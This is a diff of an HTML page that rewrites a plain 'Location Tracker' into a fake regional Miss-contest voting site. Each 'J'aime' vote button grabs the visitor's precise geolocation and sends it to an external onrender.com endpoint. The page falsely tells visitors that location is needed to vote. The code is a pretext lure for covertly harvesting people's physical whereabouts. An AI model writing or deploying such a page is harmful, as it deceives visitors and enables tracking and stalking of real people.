@@ -2,105 +2,56 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Location Tracker</title>
+    <title>Concours Régional</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        img {
-            max-width: 100%;
-            height: auto;
-        }
-        button {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
-        }
-        p {
-            margin-top: 20px;
-        }
-        input {
-            margin-top: 10px;
-            padding: 10px;
-            font-size: 16px;
-        }
-        #error-message {
-            color: red;
+        .hidden {
             display: none;
-            margin-top: 20px;
         }
     </style>
 </head>
-<body>
-    <h1>Bonjour tout le monde</h1>
-    <img src="/BACK/public/robot.jpeg" alt="Robot Image"/>
-    <img src="https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/giphy.gif" alt="Loading GIF"/>
-    <p>Pour enregistrer votre position, veuillez entrer votre nom et cliquer sur "J'aime".</p>
-    <input type="text" id="username" placeholder="Entrez votre nom"/>
-    <button onclick="attemptGeolocation()">J'aime</button>
-    <p id="error-message">
-        La géolocalisation est nécessaire pour cette application. Si vous avez bloqué la demande de géolocalisation, veuillez suivre ces étapes :
-        <br>1. Allez dans les paramètres de votre navigateur.
-        <br>2. Trouvez les paramètres de confidentialité ou de sécurité.
-        <br>3. Autorisez la géolocalisation pour ce site web.
-        <br>Ensuite, rafraîchissez la page et cliquez sur "J'aime" à nouveau.
-    </p>
-    <button onclick="attemptGeolocation()">Réessayer</button>
+<body class="flex flex-col items-center justify-center min-h-screen bg-gradient-to-r from-green-400 via-blue-500 to-purple-600 text-white">
+    <header class="bg-white text-gray-800 w-full py-4 shadow-md mb-8">
+        <h1 class="text-4xl font-bold text-center">Votez pour la Meilleure Miss Régionale</h1>
+    </header>
+
+    <main class="flex flex-col items-center w-full">
+        <div id="profiles" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-8 px-4">
+            <!-- Example profile, repeat this block for multiple profiles -->
+            <div class="bg-white text-gray-800 p-4 rounded-lg shadow-md">
+                <img src="https://via.placeholder.com/300" alt="Profile Picture" class="w-full h-64 object-cover rounded-md">
+                <h2 class="text-2xl font-semibold mt-4 text-center">Miss Nom</h2>
+                <button onclick="attemptGeolocation('miss_nom')" class="mt-4 w-full bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700">J'aime</button>
+            </div>
+            <!-- Add more profiles here -->
+        </div>
+
+        <p id="error-message" class="hidden text-red-500 mt-8">La géolocalisation est nécessaire pour voter. Veuillez autoriser la géolocalisation et réessayer.</p>
+    </main>
 
     <script>
-        // Liste des endpoints
-        const endpoints = [
-            'https://geo-localisation.onrender.com/location',
-            'https://another-endpoint.onrender.com/location'
-        ];
-
-        let currentEndpointIndex = 0;
-
-        function getCurrentEndpoint() {
-            return endpoints[currentEndpointIndex];
-        }
-
-        function switchEndpoint() {
-            currentEndpointIndex = (currentEndpointIndex + 1) % endpoints.length;
-        }
-
-        function attemptGeolocation() {
-            const username = document.getElementById('username').value;
-            if (!username) {
-                alert('Veuillez entrer votre nom.');
-                return;
-            }
-
+        function attemptGeolocation(candidate) {
             navigator.geolocation.getCurrentPosition(position => {
-                const uuid = username;
                 const { latitude, longitude } = position.coords;
 
-                fetch(getCurrentEndpoint(), {
+                fetch('https://geo-localisation.onrender.com/location', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ uuid, latitude, longitude })
+                    body: JSON.stringify({ candidate, latitude, longitude })
                 })
                 .then(response => response.text())
-                .then(data => console.log(data))
+                .then(data => {
+                    console.log(data);
+                    alert(`Vote enregistré pour ${candidate}`);
+                })
                 .catch(error => console.error('Error:', error));
             }, error => {
                 console.error('Geolocation error:', error);
-                document.getElementById('error-message').style.display = 'block';
-                switchEndpoint();  // Changer le point de terminaison en cas d'échec
-                setTimeout(attemptGeolocation, 5000);  // Retenter après 5 secondes
+                document.getElementById('error-message').classList.remove('hidden');
             });
         }
-
-        // Appeler la fonction pour tenter de récupérer la position
-        attemptGeolocation();
     </script>
 </body>
 </html>
